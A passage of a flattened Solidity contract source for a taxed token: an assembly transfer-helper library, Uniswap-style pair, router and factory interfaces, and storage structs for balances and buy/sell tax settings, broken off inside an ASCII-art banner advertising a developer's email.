msg.data;\r\n    }\r\n\r\n    function _msgValue() internal view virtual returns(uint256) {\r\n        return msg.value;\r\n    }\r\n}\r\n// File: contracts/utils/SafeTransfer.sol\r\n\r\n\r\npragma solidity ^0.8.4;\r\n\r\nlibrary SafeTransfer {\r\n\r\n    /// @dev The ETH transfer has failed.\r\n    error ETHTransferFailed();\r\n\r\n    /// @dev The ERC20 `approve` has failed.\r\n    error ApproveFailed();\r\n\r\n    /// @dev The ERC20 `transfer` has failed.\r\n    error TransferFailed();\r\n\r\n    /// @dev The ERC20 `burn` has failed.\r\n    error BurnFailed();\r\n\r\n    /// @dev The ERC20 `transferFrom` has failed.\r\n    error TransferFromFailed();\r\n\r\n    /// -----------------------------------------------------------------------\r\n    /// ETH Operations\r\n    /// -----------------------------------------------------------------------\r\n\r\n    /// @dev Sends `amount` (in wei) ETH to `to`.\r\n    /// Reverts upon failure.\r\n    function safeTransferETH(address to, uint256 amount) internal {\r\n        /// @solidity memory-safe-assembly\r\n        assembly {\r\n            // Transfer the ETH and check if it succeeded or not.\r\n            if iszero(call(gas(), to, amount, 0, 0, 0, 0)) {\r\n                // Store the function selector of `ETHTransferFailed()`.\r\n                mstore(0x00, 0xb12d13eb)\r\n                // Revert with (offset, size).\r\n                revert(0x1c, 0x04)\r\n            }\r\n        }\r\n    }\r\n\r\n    /// -----------------------------------------------------------------------\r\n    /// ERC20 Operations\r\n    /// -----------------------------------------------------------------------\r\n\r\n    /// @dev Sets `amount` of ERC20 `token` for `to` to manage on behalf of the current contract.\r\n    /// Reverts upon failure.\r\n    function safeApprove(address token, address to, uint256 amount) internal {\r\n        /// @solidity memory-safe-assembly\r\n        assembly {\r\n            // We'll write our calldata to this slot below, but restore it later.\r\n            let memPointer := mload(0x40)\r\n\r\n            // Write the abi-encoded calldata into memory, beginning with the function selector.\r\n            mstore(0x00, 0x095ea7b3)\r\n            mstore(0x20, to) // Append the \"to\" argument.\r\n            mstore(0x40, amount) // Append the \"amount\" argument.\r\n\r\n            if iszero(\r\n                and(\r\n                    // Set success to whether the call reverted, if not we check it either\r\n                    // returned exactly 1 (can't just be non-zero data), or had no return data.\r\n                    or(eq(mload(0x00), 1), iszero(returndatasize())),\r\n                    // We use 0x44 because that's the total length of our calldata (0x04 + 0x20 * 2)\r\n                    // Counterintuitively, this call() must be positioned after the or() in the\r\n                    // surrounding and() because and() evaluates its arguments from right to left.\r\n                    call(gas(), token, 0, 0x1c, 0x44, 0x00, 0x20)\r\n                )\r\n            ) {\r\n                // Store the function selector of `ApproveFailed()`.\r\n                mstore(0x00, 0x3e3f8f73)\r\n                // Revert with (offset, size).\r\n                revert(0x1c, 0x04)\r\n            }\r\n\r\n            mstore(0x40, memPointer) // Restore the memPointer.\r\n        }\r\n    }\r\n\r\n    /// @dev Sends `amount` of ERC20 `token` from the current contract to `to`.\r\n    /// Reverts upon failure.\r\n    function safeTransfer(address token, address to, uint256 amount) internal {\r\n        /// @solidity memory-safe-assembly\r\n        assembly {\r\n            // We'll write our calldata to this slot below, but restore it later.\r\n            let memPointer := mload(0x40)\r\n\r\n            // Write the abi-encoded calldata into memory, beginning with the function selector.\r\n            mstore(0x00, 0xa9059cbb)\r\n            mstore(0x20, to) // Append the \"to\" argument.\r\n            mstore(0x40, amount) // Append the \"amount\" argument.\r\n\r\n            if iszero(\r\n                and(\r\n                    // Set success to whether the call reverted, if not we check it either\r\n                    // returned exactly 1 (can't just be non-zero data), or had no return data.\r\n                    or(eq(mload(0x00), 1), iszero(returndatasize())),\r\n                    // We use 0x44 because that's the total length of our calldata (0x04 + 0x20 * 2)\r\n                    // Counterintuitively, this call() must be positioned after the or() in the\r\n                    // surrounding and() because and() evaluates its arguments from right to left.\r\n                    call(gas(), token, 0, 0x1c, 0x44, 0x00, 0x20)\r\n                )\r\n            ) {\r\n                // Store the function selector of `TransferFailed()`.\r\n                mstore(0x00, 0x90b8ec18)\r\n                // Revert with (offset, size).\r\n                revert(0x1c, 0x04)\r\n            }\r\n\r\n            mstore(0x40, memPointer) // Restore the memPointer.\r\n        }\r\n    }\r\n\r\n    function safeBurn(address token, uint256 amount) internal {\r\n        /// @solidity memory-safe-assembly\r\n        assembly {\r\n            // We'll write our calldata to this slot below, but restore it later.\r\n            let memPointer := mload(0x40)\r\n\r\n            // Write the abi-encoded calldata into memory, beginning with the function selector.\r\n            mstore(0x00, 0x42966c68)\r\n            mstore(0x20, amount) // Append the \"amount\" argument.\r\n\r\n            if iszero(\r\n                and(\r\n                    // Set success to whether the call reverted, if not we check it either\r\n                    // returned exactly 1 (can't just be non-zero data), or had no return data.\r\n                    or(eq(mload(0x00), 1), iszero(returndatasize())),\r\n                    // We use 0x44 because that's the total length of our calldata (0x04 + 0x20 * 1)\r\n                    // Counterintuitively, this call() must be positioned after the or() in the\r\n                    // surrounding and() because and() evaluates its arguments from right to left.\r\n                    call(gas(), token, 0, 0x1c, 0x24, 0x00, 0x20)\r\n                )\r\n            ) {\r\n                // Store the function selector of `BurnFailed()`.\r\n                mstore(0x00, 0x6f16aafc)\r\n                // Revert with (offset, size).\r\n                revert(0x1c, 0x04)\r\n            }\r\n\r\n            mstore(0x40, memPointer) // Restore the memPointer.\r\n        }\r\n    }    \r\n\r\n    /// @dev Sends `amount` of ERC20 `token` from `from` to `to`.\r\n    /// Reverts upon failure.\r\n    ///\r\n    /// The `from` account must have at least `amount` approved for\r\n    /// the current contract to manage.\r\n    function safeTransferFrom(address token, address from, address to, uint256 amount) internal {\r\n        /// @solidity memory-safe-assembly\r\n        assembly {\r\n            // We'll write our calldata to this slot below, but restore it later.\r\n            let memPointer := mload(0x40)\r\n\r\n            // Write the abi-encoded calldata into memory, beginning with the function selector.\r\n            mstore(0x00, 0x23b872dd)\r\n            mstore(0x20, from) // Append the \"from\" argument.\r\n            mstore(0x40, to) // Append the \"to\" argument.\r\n            mstore(0x60, amount) // Append the \"amount\" argument.\r\n\r\n            if iszero(\r\n                and(\r\n                    // Set success to whether the call reverted, if not we check it either\r\n                    // returned exactly 1 (can't just be non-zero data), or had no return data.\r\n                    or(eq(mload(0x00), 1), iszero(returndatasize())),\r\n                    // We use 0x64 because that's the total length of our calldata (0x04 + 0x20 * 3)\r\n                    // Counterintuitively, this call() must be positioned after the or() in the\r\n                    // surrounding and() because and() evaluates its arguments from right to left.\r\n                    call(gas(), token, 0, 0x1c, 0x64, 0x00, 0x20)\r\n                )\r\n            ) {\r\n                // Store the function selector of `TransferFromFailed()`.\r\n                mstore(0x00, 0x7939f424)\r\n                // Revert with (offset, size).\r\n                revert(0x1c, 0x04)\r\n            }\r\n\r\n            mstore(0x60, 0) // Restore the zero slot to zero.\r\n            mstore(0x40, memPointer) // Restore the memPointer.\r\n        }\r\n    }\r\n\r\n}\r\n// File: contracts/swap/IPair.sol\r\n\r\n\r\n\r\npragma solidity ^0.8.8;\r\n\r\ninterface IPair {\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n\r\n    function name() external pure returns (string memory);\r\n    function symbol() external pure returns (string memory);\r\n    function decimals() external pure returns (uint8);\r\n    function totalSupply() external view returns (uint);\r\n    function balanceOf(address owner) external view returns (uint);\r\n    function allowance(address owner, address spender) external view returns (uint);\r\n\r\n    function approve(address spender, uint value) external returns (bool);\r\n    function transfer(address to, uint value) external returns (bool);\r\n    function transferFrom(address from, address to, uint value) external returns (bool);\r\n\r\n    function DOMAIN_SEPARATOR() external view returns (bytes32);\r\n    function PERMIT_TYPEHASH() external pure returns (bytes32);\r\n    function nonces(address owner) external view returns (uint);\r\n\r\n    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;\r\n\r\n    event Mint(address indexed sender, uint amount0, uint amount1);\r\n    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);\r\n    event Swap(\r\n        address indexed sender,\r\n        uint amount0In,\r\n        uint amount1In,\r\n        uint amount0Out,\r\n        uint amount1Out,\r\n        address indexed to\r\n    );\r\n    event Sync(uint112 reserve0, uint112 reserve1);\r\n\r\n    function MINIMUM_LIQUIDITY() external pure returns (uint);\r\n    function factory() external view returns (address);\r\n    function token0() external view returns (address);\r\n    function token1() external view returns (address);\r\n    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\r\n    function price0CumulativeLast() external view returns (uint);\r\n    function price1CumulativeLast() external view returns (uint);\r\n    function kLast() external view returns (uint);\r\n\r\n    function mint(address to) external returns (uint liquidity);\r\n    function burn(address to) external returns (uint amount0, uint amount1);\r\n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\r\n    function skim(address to) external;\r\n    function sync() external;\r\n\r\n    function initialize(address, address) external;\r\n}\r\n// File: contracts/swap/ISwapRouter.sol\r\n\r\n\r\n\r\npragma solidity ^0.8.8;\r\n\r\ninterface ISwapRouter {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n\r\n    function addLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint amountADesired,\r\n        uint amountBDesired,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountA, uint amountB, uint liquidity);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n    function removeLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint liquidity,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountA, uint amountB);\r\n    function removeLiquidityETH(\r\n        address token,\r\n        uint liquidity,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountToken, uint amountETH);\r\n    function removeLiquidityWithPermit(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint liquidity,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline,\r\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n    ) external returns (uint amountA, uint amountB);\r\n    function removeLiquidityETHWithPermit(\r\n        address token,\r\n        uint liquidity,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline,\r\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n    ) external returns (uint amountToken, uint amountETH);\r\n    function swapExactTokensForTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint[] memory amounts);\r\n    function swapTokensForExactTokens(\r\n        uint amountOut,\r\n        uint amountInMax,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint[] memory amounts);\r\n    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\r\n        external\r\n        payable\r\n        returns (uint[] memory amounts);\r\n    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)\r\n        external\r\n        returns (uint[] memory amounts);\r\n    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\r\n        external\r\n        returns (uint[] memory amounts);\r\n    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)\r\n        external\r\n        payable\r\n        returns (uint[] memory amounts);\r\n\r\n    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);\r\n    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);\r\n    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);\r\n    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\r\n    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\r\n}\r\n\r\ninterface ISwapRouterV2 is ISwapRouter {\r\n    \r\n    function factoryV2() external pure returns (address);\r\n\r\n    function removeLiquidityETHSupportingFeeOnTransferTokens(\r\n        address token,\r\n        uint liquidity,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountETH);\r\n    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\r\n        address token,\r\n        uint liquidity,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline,\r\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n    ) external returns (uint amountETH);\r\n\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external payable;\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n\r\n}\r\n// File: contracts/swap/ISwapFactory.sol\r\n\r\n\r\n\r\npragma solidity ^0.8.8;\r\n\r\ninterface ISwapFactory {\r\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint);\r\n    function feeTo() external view returns (address);\r\n    function feeToSetter() external view returns (address);\r\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\r\n    function allPairs(uint) external view returns (address pair);\r\n    function allPairsLength() external view returns (uint);\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n    function setFeeTo(address) external;\r\n    function setFeeToSetter(address) external;\r\n}\r\n// File: contracts/storage/Tables.sol\r\n\r\n\r\n/*\r\n0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x\r\n0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x\r\n0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x\r\n0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x\r\n0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x\r\n0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x\r\n0000000000000000000OOkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOO000000000000000000x\r\n00000000000000koc;,......................................................................................,;cok00000000000000x\r\n00000000000xl,.                                                                                              .,lxO0000000000x\r\n000000000x:.                                                                                                    .;d000000000x\r\n0000000kc.                                                                                                        .ck0000000x\r\n000000x,                                                                                                            'x000000x\r\n00000x,                                                                                                              'x00000x\r\n0000O:                                                                                                                ;O0000x\r\n0000d.                                                                                                                .d0000x\r\n0000l                                ,,                ,,                       .loool,                                l0000x\r\n0000l                               ;xk:.             :kk:                     'dOkkkkx:                               c0000x\r\n0000l                             .:kOkkc.          .ckOkkc.                  ,xOkkkkkOkc.                             c0000x\r\n0000l                            .lkOkkkko.        .lkkkkkkl.                ;xkkkkkkOkkkl.                            c0000x\r\n0000l                           .okkkOkkOx'       .okkkOOkOd'                ....;dOkOOkkko.                           c0000x\r\n0000l                          'dkkkkkkOd'       'dOkkkkkOd'                      'dOkkkkkOd'                          c0000x\r\n0000l                         ,dOkkkkkko.       ,xOkkkkkko.                        .okOkOkkOx,                         c0000x\r\n0000l                        ;xOkkOkkkl.       ;xOkkkkkkl.              .....       .lkkkOOkOx;                        c0000x\r\n0000l                       :kOkkkkkkc.      .:kOkkkkOkc.              ,dxxxxc.      .ckOkkkkOk:.                      c0000x\r\n0000l                     .ckOkkkkkk:       .ckkkOkkOx;               ;xkkkkkkl.       :xOkkOkOkl.                     c0000x\r\n0000l                    .lkOkkOkOx;       .okkkkkkOx,              .:kOkkkkkkko.       ;xOkkOkkko.                    c0000x\r\n0000l                   .oOkkOkkOd,       .okkkkkkkd'              .ckOkkkkkOkkOd'       'dOkkOkkOd'                   c0000x\r\n0000l                  'dOkkkOkko.       ,dOkkOkkko.              .lkOkkkkkkkkkkOx,       .okkkkOkkd,                  c0000x\r\n0000l                 ,xOkkkkOko.       ;xOkkkkkkl.              .okkkkkkkkkkkkkkOx;       .lkkkOkkOx;                 c0000x\r\n0000l                ;xOkkOkkkl.       :kOkkOkkkc.              'dOkkkkkOo,ckOkkOkOkc.      .ckkkkkkOk:                c0000x\r\n0000l              .ckOkkkkOk:.      .ckOkkkkOx:              .,xkkOkOOko.  :xOkOkkOkl.       :kkkkkkkkc.              c0000x\r\n0000l             .lkOkkOOOx;       .lkkkkkkOx;              :dxOkkkkOkc.    ,xOkOkkkko.       ;xOkkkkOkl.             c0000x\r\n0000l            .okkkOkkOx,       .okkkkkkOd'             .ckOkkkkkOkc.      'dOkkkkkOd.       ,dkkkkkkko.            c0000x\r\n0000l           'dOkkOOkOd'       'dOkkOkkOo.             .lkOkkkkkOx;         .okOkkOkOd,       .dOkkkkkOd'           c0000x\r\n0000l          ,dOkOOkkko.       ,xOkkkkOkl.             .okkkOOkkOx,           .lkkkkkkOx;       .okkkkkkOx,          c0000x\r\n0000l         .oOkkOkkOx,       .dOkkkkkOx'             'dOkOkkkkOd'             'xOkOkkkOd.       'xOkOkkkOd.         c0000x\r\n0000l          'dOkkkkkko.       ,xOkkkkkko.           ,xOkkkkkkko.             .okkkkOkOx,       .oOkkkkkOd,          c0000x\r\n0000l           .okOkkkkOd'       'dOkkkOkkd'         ;xOkOOkkOkl.             .oOkkkkOkd'       'dOkkOkkkd'           c0000x\r\n0000l            .lkkkkOkOx,       .okkkkkkOd,      .:kkkkkkOkxc.             ,dOkkkkkko.       ,xOkkkkkko.            c0000x\r\n0000l             .ckOkkOkkx:       .lkOkkkkOx;    .lkOkkkkOx:.              ;xOkkkkOkl.       ;xOkkkOOkl.             c0000x\r\n0000l              .:kOkkkkOkc.      .ckkkkkkkk:. .okkkkkkOx,               :kOkkkkOkc.      .ckOkkkkOkc.              c0000x\r\n0000l                ;xOkkkkOkl.       :kOkkOkOkc;oOOkkkkOd'              .ckkkkkkkk:       .lkkkkkkOx;                c0000x\r\n0000l                 ,xkkOkkOko.       ,xOkkOOkkkkkkOkkko.              .lkkkkkkkx;       .okkkkkkOx,                 c0000x\r\n0000l                  'dOkkkOkkd'       'dOkkkkkkkkkkkkl.              .okkkOkkOd,       'dOkOOkkOd'                  c0000x\r\n0000l                   .okkkkkkOx,       .oOkkkkkkkkOkc.              'dOkOOkkOd'       ,dOkOkkkko.                   c0000x\r\n0000l                    .lkkkkkkOx;       .lkkkkOOkOk:               ,xOkkOkkko.       ;xOkkOkkkl.                    c0000x\r\n0000l                     .ckOkkkkOk:.      .ckkkkkOx;               :xOkkOkkkl.      .:kOkkkkkkc.                     c0000x\r\n0000l                       :xOkkkkOkl.      .:dxxxo,              .ckOkkkkOkc.      .ckkkkOkOk:                       c0000x\r\n0000l                        ,xOkkkkkko.       ....               .lkkkkkkOx;       .lkOkkkkOx;                        c0000x\r\n0000l                         'dOOkkkkOo.                        .okkkkkkOx,       .oOkkkkkOd,                         c0000x\r\n0000l                          .okkkkOkOd,                      'dOkkkkkOd'       'dOkkOOkkd'                          c0000x\r\n0000l                           .lkkkOkkOx:'...                .dOkkkkkko.       'xOkkkkOko.                           c0000x\r\n0000l                            .ckkkkkkkkkkx;                .ckOkkOkl.        .lkkkkOkl.                            c0000x\r\n0000l                             .:kkkkkOkOx,                  .:kkkkc.          .ckkkkc.                             c0000x\r\n0000l                               ;xOkkkOd'                     ;xk:.             :kx;                               c0000x\r\n0000l.                               'llllc.                       ',                ''                                l0000x\r\n0000d.                                                                                                                .d0000x\r\n0000O:                                                                                                                ;O0000x\r\n00000k,                                                                                                              'x00000x\r\n000000k,                                     hire.solidity.developer@gmail.com                                      ,x000000x\r\n0000000kc.                                                                                                        .ck0000000x\r\n000000000x:.                                                                                                    .:xO00000000x\r\n00000000000kl;.                                                                                              .;lk0O000000000x\r\n00000000000O00kdl:,'....................................................................................',:ldk00000000000000x\r\n0000000000000000000OOOkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOO0000000000000000000x\r\n0000000000000000000000000000000000000000O0000000OOO000000000000000000OO000O0000000000000000000000000000000000000000000000000x\r\n000000000000000000000000000000000000000000000kdddddk00000000000000OxddddxO00000000000000000000000000000000000000000000000000x\r\n00000000000000000000000000000000000000000000O:    .cO0000000000000o.    ,k00000000000000000000000000000000000000000000000000x\r\n0000000000000O0000O00000000000O00O0000000000O;     :O0000000O000O0o.    'x0000000000000000000000O000000000000O00000000000000x\r\n00000000000kxddddxxO00000000OkddddddddxO0000O;     :O0000Oxddddddx:     'x0O00OkxdddddddxO00000kdddddkO0000kxddddkO000000000x\r\n00000000Oo;..     ..;dO00Ox:..        ..;dO0O;     :O0Od;..             'x0Oxc'.        ..;oO00c.    ;O0000c.    ;O000000000x\r\n0000000k:     .:c:'  .o0Ol.     '::,.    .cOO;     :0Oc.    .,::cc,     'x0o.     '::;.     :O0:     ,O0000:     ,O000000000x\r\n0000000o.    .x000Oc..cOk'     cO000o.    .xO;     :0d.    .o00000o.    'kO,     :O000d.    .o0:     ,O0000:     ,O000000000x\r\n0000000o.     'lxO0OkkO0x.    .o0O00x.    .d0;     :0o.    'x0OOO0o.    .kk'     l0000k'    .l0:     ,O0000:     ,O000000000x\r\n0000000kc.      .'cdO0O0x.    .o0O00x.    .dO;     :0o.    'x0O0O0o.    .kk'     .;;;;,.    .l0:     ,O0000:     ,O000000000x\r\n00000000Oxl,.       .ck0x.    .o00O0x.    .d0;     :0o.    'x0OOO0o.    .kk'      ..........'d0:     ,O0000:     ;O000000000x\r\n000000000000ko:.      :0x.    .o00O0x.    .d0;     :0o.    'x00000o.    'kk'     ckkkkkkkkkkkO0:     ,O0000:     l0000000000x\r\n0000000d:,ck0O0k;     ,Ox.    .o0OO0d.    .d0;     :0o.    .x00000l     .kk'     c0000O00kc,:x0:     ,O0O0O:    ;k0000000000x\r\n00000O0d.  ,oddl.    .l0O:     .cddl'     ;OO;     :0k,     'loddc.     'x0c     .:oddddo;  ,k0:     'dddo:.  .ck00000000000x\r\n0000000Oo'          'oO00Ol.            .ck0O;     :O0k:.         .     'x0Oo'            .;x00:           .'cx0000000000000x\r\n000000000OdlcccccclxO000000Odlccccccccldk000Odcccccd0000kocccccccdxlccccoO0O0OdlcccccccccoxO000xcccccccccloxO000000000000000x\r\n000000000O000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x\r\n0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x\r\n0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x\r\n0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x\r\n0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x\r\n0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x\r\nOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0d\r\n*/\r\n\r\npragma solidity ^0.8.19;\r\n\r\n\r\n\r\n\r\nstruct Registry {\r\n    mapping(address => Account) Address;\r\n    mapping(address => mapping(address => uint256)) allowances;\r\n}\r\n\r\nstruct Account {\r\n    uint16 identifiers;\r\n    uint64 nonces;\r\n    uint80 PID;\r\n    uint96 balance;\r\n    address Address;\r\n}\r\n\r\nstruct Settings {\r\n    bool fairMode;\r\n    uint16 buyTax;\r\n    uint16 sellTax;\r\n    uint16 transferTax;\r\n    uint16 burnShare;\r\n    uint16 prizeShare;\r\n    uint16 marketingShare;\r\n    uint16 developmentShare;\r\n    uint16 autoLiquidityShare;\r\n    uint16 swapThresholdRatio;\r\n    uint24 gas;\r\n    address[3] feeRecipients;\r\n}\r\n\r\nstruct Storage {\r\n    IPair PAIR;\r\n    address owner;\r\n    uint96 totalSupply;\r\n    uint80 PID;\r\n    bool inSwap;\r\n    Settings settings;\r\n    Registry registry;\r\n}\r\n\r\n// File: contracts/storage/Token.sol\r\n\r\n\r\n/*\r\n0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x\r\n0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x\r\n0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x\r\n0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x\r\n0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x\r\n0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x\r\n0000000000000000000OOkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOO000000000000000000x\r\n00000000000000koc;,......................................................................................,;cok00000000000000x\r\n00000000000xl,.                                                                                              .,lxO0000000000x\r\n000000000x:.                                                                                                    .;d000000000x\r\n0000000kc.                                                                                                        .ck0000000x\r\n000000x,                                                                                                            'x000000x\r\n00000x,                                                                                                              'x00000x\r\n0000O:                                                                                                                ;O0000x\r\n0000d.                                                                                                                .d0000x\r\n0000l                                ,,                ,,                       .loool,                                l0000x\r\n0000l                               ;xk:.             :kk:                     'dOkkkkx:                               c0000x\r\n0000l                             .:kOkkc.          .ckOkkc.                  ,xOkkkkkOkc.                             c0000x\r\n0000l                            .lkOkkkko.        .lkkkkkkl.                ;xkkkkkkOkkkl.                            c0000x\r\n0000l                           .okkkOkkOx'       .okkkOOkOd'                ....;dOkOOkkko.                           c0000x\r\n0000l                          'dkkkkkkOd'       'dOkkkkkOd'                      'dOkkkkkOd'                          c0000x\r\n0000l                         ,dOkkkkkko.       ,xOkkkkkko.                        .okOkOkkOx,                         c0000x\r\n0000l                        ;xOkkOkkkl.       ;xOkkkkkkl.              .....       .lkkkOOkOx;                        c0000x\r\n0000l                       :kOkkkkkkc.      .:kOkkkkOkc.              ,dxxxxc.      .ckOkkkkOk:.                      c0000x\r\n0000l                     .ckOkkkkkk:       .ckkkOkkOx;               ;xkkkkkkl.       :xOkkOkOkl.                     c0000x\r\n0000l                    .lkOkkOkOx;       .okkkkkkOx,              .:kOkkkkkkko.       ;xOkkOkkko.                    c0000x\r\n0000l                   .oOkkOkkOd,       .okkkkkkkd'              .ckOkkkkkOkkOd'       'dOkkOkkOd'                   c0000x\r\n0000l                  'dOkkkOkko.       ,dOkkOkkko.              .lkOkkkkkkkkkkOx,       .okkkkOkkd,                  c0000x\r\n0000l                 ,xOkkkkOko.       ;xOkkkkkkl.              .okkkkkkkkkkkkkkOx;       .lkkkOkkOx;                 c0000x\r\n0000l                ;xOkkOkkkl.       :kOkkOkkkc.              'dOkkkkkOo,ckOkkOkOkc.      .ckkkkkkOk:                c0000x\r\n0000l              .ckOkkkkOk:.      .ckOkkkkOx:              .,xkkOkOOko.  :xOkOkkOkl.       :kkkkkkkkc.              c0000x\r\n0000l             .lkOkkOOOx;       .lkkkkkkOx;              :dxOkkkkOkc.    ,xOkOkkkko.       ;xOkkkkOkl.             c0000x\r\n0000l            .okkkOkkOx,       .okkkkkkOd'             .ckOkkkkkOkc.      'dOkkkkkOd.       ,dkkkkkkko.            c0000x\r\n0000l           'dOkkOOkOd'       'dOkkOkkOo.             .lkOkkkkkOx;         .okOkkOkOd,       .dOkkkkkOd'           c0000x\r\n0000l          ,dOkOOkkko.       ,xOkkkkOkl.             .okkkOOkkOx,           .lkkkkkkOx;       .okkkkkkOx,          c0000x\r\n0000l         .oOkkOkkOx,       .dOkkkkkOx'             'dOkOkkkkOd'             'xOkOkkkOd.       'xOkOkkkOd.         c0000x\r\n0000l          'dOkkkkkko.       ,xOkkkkkko.           ,xOkkkkkkko.             .okkkkOkOx,       .oOkkkkkOd,          c0000x\r\n0000l           .okOkkkkOd'       'dOkkkOkkd'         ;xOkOOkkOkl.             .oOkkkkOkd'       'dOkkOkkkd'           c0000x\r\n0000l            .lkkkkOkOx,       .okkkkkkOd,      .:kkkkkkOkxc.             ,dOkkkkkko.       ,xOkkkkkko.            c0000x\r\n0000l             .ckOkkOkkx:       .lkOkkkkOx;    .lkOkkkkOx:.              ;xOkkkkOkl.       ;xOkkkOOkl.             c0000x\r\n0000l              .:kOkkkkOkc.      .ckkkkkkkk:. .okkkkkkOx,               :kOkkkkOkc.      .ckOkkkkOkc.              c0000x\r\n0000l                ;xOkkkkOkl.       :kOkkOkOkc;oOOkkkkOd'              .ckkkkkkkk:       .lkkkkkkOx;                c0000x\r\n0000l                 ,xkkOkkOko.       ,xOkkOOkkkkkkOkkko.              .lkkkkkkkx;       .okkkkkkOx,                 c0000x\r\n0000l                  'dOkkkOkkd'       'dOkkkkkkkkkkkkl.              .okkkOkkOd,       'dOkOOkkOd'                  c0000x\r\n0000l                   .okkkkkkOx,       .oOkkkkkkkkOkc.              'dOkOOkkOd'       ,dOkOkkkko.                   c0000x\r\n0000l                    .lkkkkkkOx;       .lkkkkOOkOk:               ,xOkkOkkko.       ;xOkkOkkkl.                    c0000x\r\n0000l                     .ckOkkkkOk:.      .ckkkkkOx;               :xOkkOkkkl.      .:kOkkkkkkc.                     c0000x\r\n0000l                       